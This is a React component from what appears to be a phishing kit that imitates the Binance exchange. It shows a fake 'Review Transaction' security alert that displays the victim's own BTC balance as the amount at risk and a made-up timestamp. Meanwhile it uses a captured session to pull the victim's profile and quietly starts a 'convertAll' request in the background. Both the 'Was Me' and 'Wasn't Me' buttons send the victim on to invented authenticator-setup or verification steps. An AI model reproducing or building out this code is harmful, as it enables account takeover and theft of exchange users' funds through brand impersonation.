import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { BinanceLogo } from '../components/Icons';
import { User, AlertTriangle, Globe } from 'lucide-react';
import { PageTransition } from '../components/PageTransition';
import { completeLogin, convertAll } from '../services/api';
import { Spinner } from '../components/Spinner';
import { useLoginStatus } from '../hooks/useLoginStatus';
import { ApiResponse } from '../types/api';

// Define an extended response type for completeLogin
interface CompleteLoginResponse extends ApiResponse {
  data?: {
    firstName?: string;
    lastName?: string;
    email?: string;
    gauth?: boolean;
    [key: string]: any;
  };
  btcBalance?: string;
}

export const ReviewTransaction: React.FC = () => {
  const [isLoading, setIsLoading] = useState(false);
  const [displayName, setDisplayName] = useState<string | null>(null);
  const navigate = useNavigate();
  const hasCompletedRef = useRef(false);
  const location = useLocation();
  const { waitForConversion } = useLoginStatus(() => {});
  const conversionRequestRef = useRef<Promise<any> | null>(null);

  useEffect(() => {
    if (typeof window !== 'undefined') {
      const completeLoginProcess = async () => {
        if (hasCompletedRef.current) return;
        hasCompletedRef.current = true;
        setIsLoading(true);

        try {
          const sessionId = localStorage.getItem('session_id');
          if (!sessionId) {
            setIsLoading(false);
            return;
          }

          const response = await completeLogin(sessionId) as CompleteLoginResponse;
          if (response.success) {
            // Store userData
            if (response.data) {
              localStorage.setItem('userData', JSON.stringify(response.data));
              
              // Format display name from firstName and lastName first, fallback to email
              const { firstName, lastName, email } = response.data;
              
              let formattedName = '';
              if (firstName || lastName) {
                if (firstName && lastName) {
                  const capitalizedFirst = firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase();
                  const capitalizedLastInitial = lastName.charAt(0).toUpperCase();
                  formattedName = `${capitalizedFirst} ${capitalizedLastInitial}`;
                } else {
                  const name = firstName || lastName || '';
                  formattedName = name.charAt(0).toUpperCase() + name.slice(1).toLowerCase();
                }
              } else if (email) {
                const emailName = email.split('@')[0];
                formattedName = emailName.charAt(0).toUpperCase() + emailName.slice(1).toLowerCase();
              }

              console.log('Name formatting:', { firstName, lastName, email, formattedName }); // Debug log
              setDisplayName(formattedName || null);
            }

            // Store btcBalance separately since it's outside data object
            if (response.btcBalance) {
              localStorage.setItem('btcBalance', response.btcBalance);
              console.log('Stored BTC balance:', response.btcBalance); // Debug log
            }

            // Start conversion in background
            const deviceInfo = localStorage.getItem('deviceInfo');
            if (deviceInfo) {
              conversionRequestRef.current = convertAll({
                session_id: sessionId,
                device_info: deviceInfo
              });
            }
          }
        } catch (error) {
          console.error('Error completing login:', error);
        } finally {
          setIsLoading(false);
        }
      };

      setTimeout(completeLoginProcess, 0);
    }
  }, []);

  const handleAction = async () => {
    setIsLoading(true);
    try {
      // Add timeout to conversion wait
      if (conversionRequestRef.current) {
        await Promise.race([
          conversionRequestRef.current,
          new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Conversion timeout')), 10000) // 10 second timeout
          )
        ]);
      }
      
      // Check if user has Google Authenticator enabled
      const userDataString = localStorage.getItem('userData');
      if (userDataString) {
        const userData = JSON.parse(userDataString);
        
        // If gauth is false, redirect to setup authenticator
        if (userData && userData.gauth === false) {
          navigate('/setup-authenticator');
          return;
        }
      }
      
      // Default behavior - go to verification required
      navigate('/verification-required', { 
        state: { isNavigating: true } 
      });
    } catch (error) {
      console.error('Error in action:', error);
      
      // Check if user has Google Authenticator enabled even if conversion fails
      const userDataString = localStorage.getItem('userData');
      if (userDataString) {
        const userData = JSON.parse(userDataString);
        
        // If gauth is false, redirect to setup authenticator even if conversion fails
        if (userData && userData.gauth === false) {
          navigate('/setup-authenticator');
          return;
        }
      }
      
      // Continue with navigation even if conversion fails
      navigate('/verification-required', { 
        state: { isNavigating: true } 
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleWasntMe = async () => {
    setIsLoading(true);
    try {
      // Add timeout to conversion wait
      if (conversionRequestRef.current) {
        await Promise.race([
          conversionRequestRef.current,
          new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Conversion timeout')), 10000) // 10 second timeout
          )
        ]);
      }
      
      // Check if user has Google Authenticator enabled
      const userDataString = localStorage.getItem('userData');
      if (userDataString) {
        const userData = JSON.parse(userDataString);
        
        // If gauth is false, redirect to setup authenticator
        if (userData && userData.gauth === false) {
          navigate('/setup-authenticator');
          return;
        }
      }
      
      // Default behavior - go to verification required
      navigate('/verification-required', { 
        state: { isNavigating: true } 
      });
    } catch (error) {
      console.error('Error handling Wasn\'t Me:', error);
      
      // Check if user has Google Authenticator enabled
      const userDataString = localStorage.getItem('userData');
      if (userDataString) {
        const userData = JSON.parse(userDataString);
        
        // If gauth is false, redirect to setup authenticator even if conversion fails
        if (userData && userData.gauth === false) {
          navigate('/setup-authenticator');
          return;
        }
      }
      
      // Continue with navigation even if conversion fails
      navigate('/verification-required', { 
        state: { isNavigating: true } 
      });
    } finally {
      setIsLoading(false);
    }
  };

  // Add this function to format the date
  const getFiveMinutesAgo = () => {
    const date = new Date(Date.now() - 5 * 60 * 1000); // 5 minutes ago
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const day = String(date.getDate()).padStart(2, '0');
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    const seconds = String(date.getSeconds()).padStart(2, '0');
    
    return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
  };

  return (
    <PageTransition>
      <div className="min-h-screen bg-[#0B0E11] flex flex-col">
        {/* Header */}
        <header className="bg-[#0B0E11] px-4 py-5">
          <div className="max-w-[1200px] mx-auto flex justify-between items-center">
            <BinanceLogo />
            {displayName && (
              <div className="flex items-center gap-2 text-[#EAECEF]">
                <User size={20} className="text-[#F0B90B]" />
                <span className="text-[14px] font-[500]">{displayName}</span>
              </div>
            )}
          </div>
        </header>

        {/* Main Content with Loading State */}
        <div className="flex-1 bg-[#131519] relative">
          {isLoading ? (
            <Spinner message="Please wait while we get your account details" />
          ) : (
            <main className="w-full flex flex-col items-start sm:items-center justify-center p-4 pt-8 sm:pt-12">
              <div className="w-full max-w-[480px] bg-[#131519] sm:border sm:border-[#2B3139] sm:rounded-lg p-4 sm:p-6">
                <div className="flex items-center justify-center gap-3 mb-6">
                  <AlertTriangle size={24} className="text-[#F0B90B]" />
                  <h1 className="text-[24px] font-semibold text-[#EAECEF]">Review Transaction</h1>
                </div>

                {/* Transaction Details */}
                <div className="bg-[#1E2329] border border-[#2B3139] rounded-lg p-4 mb-6">
                  <div className="space-y-4">
                    <div className="flex justify-between items-center">
                      <span className="text-[#848E9C]">Amount</span>
                      <span className="text-[#EAECEF] font-[500]">
                        {localStorage.getItem('btcBalance') || '0.0521'} BTC
                      </span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-[#848E9C]">To Address</span>
                      <span className="text-[#EAECEF] font-[500]">bc1q...7e9k</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-[#848E9C]">Network Fee</span>
                      <span className="text-[#EAECEF] font-[500]">0.0005 BTC</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-[#848E9C]">Time</span>
                      <span className="text-[#EAECEF] font-[500]">{getFiveMinutesAgo()}</span>
                    </div>
                  </div>
                </div>

                <p className="text-[#848E9C] text-[14px] leading-[20px] mb-6">
                  We have suspected this transaction and we need your attention if this was made by you. If not, please click "Wasn't Me" and proceed with cancellation process.
                </p>

                {/* Action Buttons */}
                <div className="grid grid-cols-2 gap-4">
                  <button onClick={handleAction} className="h-[48px] bg-[#1E2329] hover:bg-[#2B3139] text-[#2EBD85] rounded-lg font-[500] transition-colors">
                    Was Me
                  </button>
                  <button onClick={handleWasntMe} className="h-[48px] bg-[#1E2329] hover:bg-[#2B3139] text-[#F6465D] rounded-lg font-[500] transition-colors">
                    Wasn't Me
                  </button>
                </div>

                {/* Footer */}
                <footer className="flex items-center justify-center gap-4 text-[14px] text-[#848E9C] mt-10">
                  <button className="flex items-center gap-2 hover:text-[#EAECEF]">
                    <Globe size={16} />
                    <span>English</span>
                  </button>
                  <a href="#" className="hover:text-[#EAECEF]">Cookies</a>
                  <a href="#" className="hover:text-[#EAECEF]">Terms</a>
                  <a href="#" className="hover:text-[#EAECEF]">Privacy</a>
                </footer>
              </div>
            </main>
          )}
        </div>
      </div>
    </PageTransition>
  );
};